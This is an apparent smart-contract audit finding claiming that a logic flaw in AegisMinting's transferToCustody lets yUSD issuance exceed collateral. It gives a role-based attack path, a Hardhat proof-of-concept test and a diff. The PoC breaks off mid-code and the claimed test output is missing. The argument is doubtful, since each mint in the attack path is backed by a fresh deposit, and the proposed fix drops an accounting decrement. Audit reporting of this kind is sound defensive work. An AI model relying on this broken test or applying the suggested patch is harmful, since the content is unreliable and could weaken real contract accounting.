# Possible devaluation of issued tokens due to logic flaw in `AegisMinting::transferToCustody` function

### Summary

It is the protocol's intension for total amount of underlying assets to always match or exceed the total user liabilities or issued tokens (see [here](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/README.md?plain=1#L42-L44)). However, a logic flaw in the `AegisMinting::transfeToCustody` function allows for amount of tokens issued to exceed amount of underlying assets.

### Root Cause

The `AegisMinting::depositIncome` function always checks for sufficient available assets before minting `yusd` tokens to the rewards contract (see [here](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/AegisMinting.sol#L407-L410)) and increments the `_custodyTransferrableAssetFunds` by `collateralAmount` see [here](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/AegisMinting.sol#L414)

However, the `AegisMinting::transferToCustody` function decrements the `_custodyTransferrableAssetFunds` by `amount` see [here](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/AegisMinting.sol#L453). This allows for issuing of more tokens without actual increment in underlying assets simply by sending collateral to the `AegisMinting` contract, issuing `yusd` tokens using the `AegisMinting::depositIncome` and transferring the underlying assets to the custodian wallet through the `AegisMinting::transferToCustody` function over and over again.

### Internal Pre-conditions

1. FUNDS_MANAGER_ROLE sends some `collateralAmount` to the `AegisMinting` contract
2. FUNDS_MANAGER_ROLE calls the `AegisMinting::depositIncome` function specifying `collateralAmount` and the equivalent amount of `yusd` tokens to mint, say `yusdAmount`
3. COLLATERAL_MANAGER_ROLE calls the `AegisMinting::transferToCustody` function, transferring all underlying assets (`collateralAmount`) to FUNDS_MANAGER_ROLE (for simplicity, we assume FUNDS_MANAGER_ROLE is also set as CustodianWallet)
4. FUNDS_MANAGER_ROLE sends the same `collateralAmount` to the `AegisMinting` contract again
5. FUNDS_MANAGER_ROLE calls the `AegisMinting::depositIncome` function specifying `collateralAmount` and the equivalent amount of `yusd` tokens to mint, i.e. `yusdAmount`

### External Pre-conditions

NA

### Attack Path

1. FUNDS_MANAGER_ROLE sends some `collateralAmount = 100` to the `AegisMinting` contract. Now, collateral balance of the `AegisMinting` contract is `100`
2. FUNDS_MANAGER_ROLE calls the `AegisMinting::depositIncome` function specifying `collateralAmount` and the equivalent amount of `yusd` tokens to mint, say `yusdAmount = 100`. Now, the collateral balance of the `AegisMinting` contract remains `100` and `_custodyTransferrableAssetFunds[collateral] = 100`. We have `100` collateral and `100` yusd tokens
3. COLLATERAL_MANAGER_ROLE calls the `AegisMinting::transferToCustody` function, transferring all underlying assets (`collateralAmount`) to FUNDS_MANAGER_ROLE (for simplicity, we assume FUNDS_MANAGER_ROLE is also set as CustodianWallet). This resets the collateral balance of the `AegisMinting` contract and `_custodyTransferrableAssetFunds[collateral]` to zero.
4. FUNDS_MANAGER_ROLE sends the same `collateralAmount` to the `AegisMinting` contract again setting collateral balance of the `AegisMinting` contract as `100`.
5. FUNDS_MANAGER_ROLE calls the `AegisMinting::depositIncome` function specifying `collateralAmount` and the equivalent amount of `yusd` tokens to mint, i.e. `yusdAmount = 100`. Now, the collateral balance of the `AegisMinting` contract remains `100` and `_custodyTransferrableAssetFunds[collateral] = 100`. We have `100` collateral and `100 + 100` yusd tokens


### Impact

With more issued tokens than underlying assets, the protocol invariant is broken. More so, users who wish to redeem their `yusd` token for some collateral may not be able to do so due to token devaluation since there are more issued tokens than should be.
This can grief the protocol as users will desert the protocol when such happens.

### PoC

Add this code to the `4_aegis_minting.spec.ts` file 

```javascript
describe('Spomaria_Poc--Broken-Invariant', () => {
      it.only('should mint yusd that exceeds collateral balance distorting yusd to collateral ratio', async() => {
        const [owner, sender] = await ethers.getSigners()
      
        const { aegisMintingContract, aegisMintingAddress, assetContract, assetAddress, aegisConfig, aegisRewardsContract, yusdContract } = await loadFixture(deployFixture)

        await aegisMintingContract.grantRole(FUNDS_MANAGER_ROLE, owner)
        await aegisMintingContract.grantRole(COLLATERAL_MANAGER_ROLE, owner)
        await aegisConfig.setOperator(owner, true)
        await aegisConfig['whitelistAddress(address,bool)'](sender, true)
        await aegisMintingContract.addCustodianAddress(owner.address)

        await assetContract.mint(owner.address, ethers.parseEther('100'))
        // await assetContract.connect(owner).approve(aegisMintingAddress, ethers.parseEther('1000'))

        // FUNDS_MANAGER sends some collateral to the AegisMinting contract to allow them mint some yusd to the AegisRewards contract
        await assetContract.connect(owner).transfer(aegisMintingAddress, collateralAmount)


        const initialCollateralBalance = await assetContract.balanceOf(aegisMintingContract)
        console.log("Initial Collateral Balance in AegisMinting:", initialCollateralBalance)

        const initialCollateralSupply = await assetContract.totalSupply()
        console.log("Initial Collateral Total Supply:", initialCollateralSupply)

        // Mint yusd tokens to AegisRewards Contract without sending any collateral to the AegisMinting Contract

        const afterYUSDBalance1 = await yusdContract.balanceOf(aegisRewardsContract)
        console.log("YUSD Balance for Rewards After First Deposit:", afterYUSDBalance1)

        // Funds manager sends collateral to custody (themselves)
        await expect(aegisMintingContract.connect(owner).transferToCustody(owner.address, assetAddress, collateralAmount)).not.to.be.reverted

        // FUNDS_MANAGER sends thae collateral back to the AegisMinting contract to allow them mint some yusd to the AegisRewards contract

        await assetContract.connect(owner).transfer(aegisMintingAddress, collateralAmount)


        const blockTime2 = await time.latest()
        const order2 = {

Next run `npx hardhat test`
Test passes with the following output

### Mitigation

Consider modifying the `AegisMinting::transferToCustody` to not decrement the `_custodyTransferrableAssetFunds` variable. This way, more `yusd` tokens can only be issued if more actual underlying assets are added to the protocol

```diff
  function transferToCustody(
    address wallet,
    address asset,
    uint256 amount
  ) external nonReentrant onlyRole(COLLATERAL_MANAGER_ROLE) onlySupportedAsset(asset) onlyCustodianAddress(wallet) {
    uint256 availableBalance = _custodyAvailableAssetBalance(asset);
    if (availableBalance < amount) {
      revert NotEnoughFunds();
    }


-   _custodyTransferrableAssetFunds[asset] -= amount;
    IERC20(asset).safeTransfer(wallet, amount);


    emit CustodyTransfer(wallet, asset, amount);
  }
```
